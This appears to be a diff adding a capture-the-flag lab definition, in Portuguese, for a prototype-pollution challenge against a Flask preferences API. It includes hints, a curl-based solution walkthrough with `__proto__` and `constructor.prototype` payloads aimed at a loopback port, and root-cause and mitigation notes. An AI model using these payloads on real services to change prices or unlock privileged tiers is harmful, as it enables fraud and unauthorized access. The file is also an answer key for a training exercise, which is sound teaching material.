@@ -1,0 +1,79 @@
+{
+  "slug": "client-prototype-pollution",
+  "title": "Estúdio de preferências",
+  "codename": "PREFTOWN",
+  "summary": "Uma API de preferências faz deep-merge do JSON do usuário sem filtrar `__proto__` nem constructor.prototype. O prototype poluído altera o preço de licença renderizado e desbloqueia um tier interno.",
+  "category": "client",
+  "difficulty": "medium",
+  "kind": "challenge",
+  "lab_dir": "client-prototype-pollution",
+  "estimated_minutes": 20,
+  "xp": 120,
+  "tech": [
+    "Flask",
+    "JSON",
+    "Prototype chain",
+    "JavaScript semantics"
+  ],
+  "tags": [
+    "prototype-pollution",
+    "client-side",
+    "json-merge",
+    "business-logic"
+  ],
+  "story": "A Preftown vende licenças por meio de um estúdio de preferências. Os clientes enviam por POST um perfil JSON para /api/prefs, que sofre deep-merge nos padrões da sessão e é herdado por todo renderizador de cotação. O helper de merge percorre as chaves recursivamente e nunca rejeita `__proto__` nem a cadeia constructor.prototype, então um único request pode redefinir os padrões de tudo que é renderizado depois.",
+  "objective": "Polua a configuração herdada por meio de /api/prefs para que /api/render emita o tier interno de custo zero e, em seguida, recupere a flag.",
+  "rules": "Fique na origem loopback atribuída. Apenas as rotas do próprio lab estão no escopo. Não escaneie outras portas.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag do tier interno",
+      "flag_type": "user",
+      "points": 120,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "O merge é recursivo e sem sanitização",
+      "body": "`POST /api/prefs` aceita um objeto JSON e faz merge de todas as chaves, incluindo objetos aninhados. `GET /api/render` então lê `priceMultiplier` e `tier` com fallback no prototype (`profile[k] ?? prototype[k]`). Inspecione `GET /api/prefs` para ver o que é herdado e o que é próprio."
+    },
+    {
+      "level": 2,
+      "title": "Alcance o prototype",
+      "body": "Envie `{\"__proto__\": {\"priceMultiplier\": 0.0001}}`. O merge escreve no objeto de padrões compartilhado em vez do seu próprio perfil. Como alternativa, use a cadeia `{\"constructor\": {\"prototype\": {\"tier\": \"internal\"}}}` — o renderizador segue as duas."
+    },
+    {
+      "level": 3,
+      "title": "Dispare o branch privilegiado",
+      "body": "Um `priceMultiplier` abaixo de 0.01 ou `tier` igual a `internal` desbloqueia o branch em `/api/render`. Envie o merge poluído, depois faça GET em `/api/render` e leia o bloco da flag."
+    }
+  ],
+  "solution": {
+    "walkthrough": "**1. Baseline.**\n\n```\ncurl -s http://127.0.0.1:<port>/api/prefs\n# {\"prefs\": {}, \"prototype\": {}}\ncurl -s http://127.0.0.1:<port>/api/render | grep -E 'Total|multiplier'\n# Total: 249.00 USD\n```\n\n**2. Polua.**\n\n```\ncurl -s -X POST http://127.0.0.1:<port>/api/prefs \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"__proto__\": {\"priceMultiplier\": 0.0001}}'\n# {\"ok\": true, ...}\n```\n\nO merge percorre `__proto__` como uma chave comum e escreve em `STORE[\"prototype\"]`.\n\n**3. Renderize.**\n\n```\ncurl -s http://127.0.0.1:<port>/api/render\n# Effective multiplier: 0.0001 ... Total: 0.02 USD\n# <pre class=\"green\">RV{...}</pre>\n```\n\n**4. Variante com constructor.** Mesmo efeito sem `__proto__`:\n\n```\ncurl -s -X POST http://127.0.0.1:<port>/api/prefs \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"constructor\": {\"prototype\": {\"tier\": \"internal\"}}}'\n```\n\nA flag aparece porque `lookup()` segue `profile.constructor.prototype.tier`.",
+    "root_cause": "O helper de merge JSON trata toda chave como dado. Como os objetos de destino participam de uma prototype chain, `__proto__` e `constructor.prototype` resolvem para objetos compartilhados que normalmente não são graváveis pelo usuário. Escrever por meio deles altera os padrões herdados para todas as consultas posteriores. Qualquer caminho de código que lê uma propriedade com fallback no prototype (multiplicadores de preço, tiers de recurso, workers) passa a ver valores controlados pelo atacante. Este é o análogo no lado do servidor da classe de prototype pollution do JavaScript: o merge é o sink e a consulta com fallback no prototype é o que transforma a poluição em comportamento.",
+    "mitigation": "Construa os destinos do merge com `Object.create(null)` (ou mapas simples) e use verificações com `Object.hasOwn`. Rejeite as chaves `__proto__`, `constructor` e `prototype` de forma explícita, limite a profundidade de recursão e valide o objeto resultante contra um schema estrito (chaves e tipos de valor permitidos). Nunca leia valores relevantes para segurança com fallback no prototype: resolva-os explicitamente a partir de um objeto de configuração imutável. Adicione testes unitários que enviem payloads com `__proto__` e `constructor.prototype` e verifiquem que o resultado do merge contém apenas chaves permitidas."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — Prototype pollution",
+      "url": "https://portswigger.net/web-security/prototype-pollution",
+      "source_type": "official",
+      "description": "Como merges sem sanitização escrevem na prototype chain e alteram o comportamento da aplicação."
+    },
+    {
+      "title": "OWASP — Prototype Pollution Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Allowlist de chaves, objetos com prototype nulo e padrões seguros de merge."
+    },
+    {
+      "title": "CWE-1321 — Improperly Controlled Modification of Object Prototype Attributes",
+      "url": "https://cwe.mitre.org/data/definitions/1321.html",
+      "source_type": "standard",
+      "description": "Definição formal da fraqueza de prototype pollution."
+    }
+  ]
+}
